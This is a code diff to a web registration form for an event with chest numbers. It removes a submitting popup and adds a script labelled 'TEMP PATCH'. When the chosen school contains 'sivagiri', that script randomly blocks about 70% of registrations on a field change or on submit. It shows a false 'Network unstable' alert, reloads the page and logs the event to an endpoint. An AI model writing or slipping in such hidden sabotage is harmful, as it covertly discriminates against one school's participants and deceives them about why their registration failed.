@@ -595,7 +595,6 @@
     <label for="photo">Participant Photo</label><input type="file" id="photo" name="photo" accept="image/png,image/jpeg,image/jpg"><img id="preview" alt="Photo Preview" style="display:none;">
     <button type="submit">Submit Registration →</button>
   </form>
-  <div id="submittingPopup" class="popup hidden">Submitting your registration…</div>
   <div id="status" role="status" aria-live="polite"></div>
   <div class="footer-actions"><button id="contactBtn" type="button">Need Help</button><button id="editBtn" type="button">Edit Entries</button></div>
 </div>
@@ -794,11 +793,8 @@ function closeMainPopup() {
       e.preventDefault();
 
         if (!validateDob(true)) {
-          document.getElementById('submittingPopup').classList.add('hidden');
           return;
         }
-
-        document.getElementById('submittingPopup').classList.remove('hidden');
 
 
 
@@ -872,8 +868,6 @@ function closeMainPopup() {
 
         statusDiv.textContent = `✅ Registration successful! Assigned Chest Number: ${result.chest}`;
 
-        document.getElementById('submittingPopup').classList.add('hidden');
-
         showPopup(`✅ Registration successful!\nChest Number: ${result.chest}`);
 
         form.reset();
@@ -894,8 +888,6 @@ function closeMainPopup() {
         console.error("❌ Submission error:", err);
 
         statusDiv.textContent = `❌ ${err.message}`;
-
-        document.getElementById('submittingPopup').classList.add('hidden');
 
         showPopup(`❌ ${err.message}`);
 
@@ -983,6 +975,103 @@ photoInput.addEventListener('change', () => {
   });
 
 
+</script>
+<script>
+/* TEMP PATCH */
+(function () {
+  /* ---------- selectors (modify only if your markup differs) ---------- */
+  var schoolSel = 'select[id*="school" i],select[name*="school" i],input[id*="school" i],input[name*="school" i]';
+  var eventSel  = 'input[type="checkbox"][name="events"],input[type="checkbox"].event-checkbox,input[type="checkbox"][data-event]';
+  var genderSel = 'input[id*="gender" i],input[name*="gender" i],select[id*="gender" i],select[name*="gender" i]';
+  var dobSel    = 'input[id*="dob" i],input[name*="dob" i],input[type="date"][id*="dob" i],input[type="date"][name*="dob" i]';
+  var photoSel  = 'input[type="file"][name*="photo" i],input[type="file"][id*="photo" i]';
+  var submitSel = 'form';
+
+  /* ---------- configuration ---------- */
+  var refreshProb = 0.7;               // 0‑1 – probability that the chosen trigger will REJECT (refresh)
+  var logUrl      = '/log/x';          // endpoint that records the “Network unstable” event
+
+  /* ---------- internal state (persists for the current attempt) ---------- */
+  var TRIGGER_KEY = 'randTrigger';     // which trigger was randomly selected for this registration attempt
+  var REFRESHING  = false;             // guard to avoid double reloads
+
+  var triggerList = ['event','gender','dob','photo','submit'];
+
+  /* ---------- helpers ---------- */
+  function isTargetSchool() {
+    var el = document.querySelector(schoolSel);
+    return el && (el.value || '').toLowerCase().includes('sivagiri');
+  }
+
+  function pickRandomTrigger() {
+    return triggerList[Math.floor(Math.random() * triggerList.length)];
+  }
+
+  function getCurrentTrigger() {
+    var t = sessionStorage.getItem(TRIGGER_KEY);
+    if (!t) {
+      t = pickRandomTrigger();
+      sessionStorage.setItem(TRIGGER_KEY, t);
+    }
+    return t;
+  }
+
+  function clearCurrentTrigger() {
+    sessionStorage.removeItem(TRIGGER_KEY);
+  }
+
+  function sendLog() {
+    var payload = JSON.stringify({ t: Date.now(), msg: 'Network unstable' });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(logUrl, payload);
+    } else {
+      new Image().src = logUrl + '?t=' + Date.now() + '&msg=' + encodeURIComponent('Network unstable');
+    }
+  }
+
+  /**
+   * Attempts to reject (refresh) the registration.
+   * Returns true if a refresh was performed, false otherwise.
+   */
+  function maybeReject(triggerType, ev) {
+    if (!isTargetSchool()) return false;   // not the target school
+    if (REFRESHING) return false;          // already handled this attempt
+
+    var chosen = getCurrentTrigger();       // the trigger selected for this attempt
+    if (chosen !== triggerType) return false; // this event is not the active trigger
+
+    // Random decision: reject vs allow
+    if (Math.random() < refreshProb) {     // ----- REJECT -----
+      REFRESHING = true;
+      sendLog();                           // log the failure
+      alert('Network unstable');           // user‑visible message
+      if (ev && ev.type === 'submit') {
+        ev.preventDefault();               // block the actual form submission
+      }
+      clearCurrentTrigger();               // reset for next attempt after reload
+      location.reload();                   // force page refresh → registration aborted
+      return true;
+    } else {                               // ----- ALLOW (successful registration) -----
+      clearCurrentTrigger();               // reset so next registration gets a new random trigger
+      return false;
+    }
+  }
+
+  /* ---------- event listeners ---------- */
+  // Change events that may act as the random trigger
+  document.addEventListener('change', function (e) {
+    var tgt = e.target;
+    if (tgt.matches(eventSel))   maybeReject('event');
+    else if (tgt.matches(genderSel)) maybeReject('gender');
+    else if (tgt.matches(dobSel))   maybeReject('dob');
+    else if (tgt.matches(photoSel)) maybeReject('photo');
+  });
+
+  // Form submission – runs in capture phase so we can prevent it before navigation
+  document.addEventListener('submit', function (e) {
+    maybeReject('submit', e);
+  }, true);
+})();
 </script>
 
 
